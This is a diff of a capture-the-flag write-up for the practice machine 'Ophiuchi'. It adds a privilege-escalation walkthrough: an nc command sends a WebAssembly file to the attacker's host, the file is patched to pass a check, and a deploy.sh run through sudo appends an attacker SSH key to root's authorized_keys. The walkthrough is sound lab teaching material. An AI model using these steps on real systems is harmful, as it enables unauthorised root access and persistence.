@@ -72,38 +72,51 @@ First, I checked what sudo capabilities our user admin got.
 
 So we can run `/usr/bin/go run /opt/wasm-functions/index.go` with root privileges. Let’s check out the file.
 
-`package main
-
-import (
-        "fmt"
-        wasm "github.com/wasmerio/wasmer-go/wasmer"
-        "os/exec"
-        "log"
-)
-
-
-func main() {
-        bytes, _ := wasm.ReadBytes("main.wasm")
-
-        instance, _ := wasm.NewInstance(bytes)
-        defer instance.Close()
-        init := instance.Exports["info"]
-        result,_ := init()
-        f := result.String()
-        if (f != "1") {          <==========================================
-                fmt.Println("Not ready to deploy")
-        } else {
-                fmt.Println("Ready to deploy")
-                out, err := exec.Command("/bin/sh", "deploy.sh").Output()
-                if err != nil {
-                        log.Fatal(err)
-                }
-                fmt.Println(string(out))
-        }
-}`
-
 If we're able to control the f variable, then we can create a deploy.sh to be executed in another directory. What's notable here is that absolute path is not used for main.wasm and the deploy.sh files. These files will be read from our current working directory, from where we run the index.go file.
 
+We make our working directory in tmp and copy over the main.wasm file.
+
+`cd tmp
+mkdir work && cd work
+
+cp /opt/wasm-functions/main.wasm ./`
+
+Writing our own deploy echoing the id of the user gives us the error 'Not ready to deploy'. So the value of f is not 1, which is read from the wasm file.
+
+The text readable format of WASM binary is WAT(Web Assembly Text). We can manipulate the value of f editing the wasm file in this format. 
+
+We install the toolsuit https://github.com/webassembly/wabt We have 2 binaries wasm2wat and wat2wasm that we can use, then we transfer the main.wasm file from the target machine to our local machine using nc.
+
+`cat main.wasm | nc {your-ip} {your-port}   (on target)
+nc -lnvp {your-port} > main.wasm           (on local)`
+
+Then, we convert the wasm to wat
+
+`wasm2wat main.wasm > main.wat
+cat main.wat`
+
+Here we see that the value of f is a constant 0, we change that to 1, our required value and convert the wat back to wasm, before moving it back.
+  
+`[-]    i32.const 0)
+[+]    i32.const 1)  
+
+wat2wasm main.wat
+scp main.wasm admin@ophiuchi.htb:/tmp/work`
+
+Now, we run the sudo command again. And this time we get command execution as root. Then, we get our id_rsa.pub using ssh-keygen and paste it to the authorized_keys file at /root/.ssh/ using the deploy.sh file to be able to SSH into the machine as root.
+
+`#!/bin/sh
+
+echo $(id)
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABA***********************************************************************************************************************************************
+***************************************************************************************************************************************************************************************
+*********************************************************************************************************************************************************************************7BLa+Y
+zHy+9fuMs= root@kali" >> /root/.ssh/authorized_keys`
+
+Finally we grab the root.txt file with SSH.
+
+`ssh root@ophiuchi.htb
+cat root.txt`
 
 ## 5. Cleanup
  
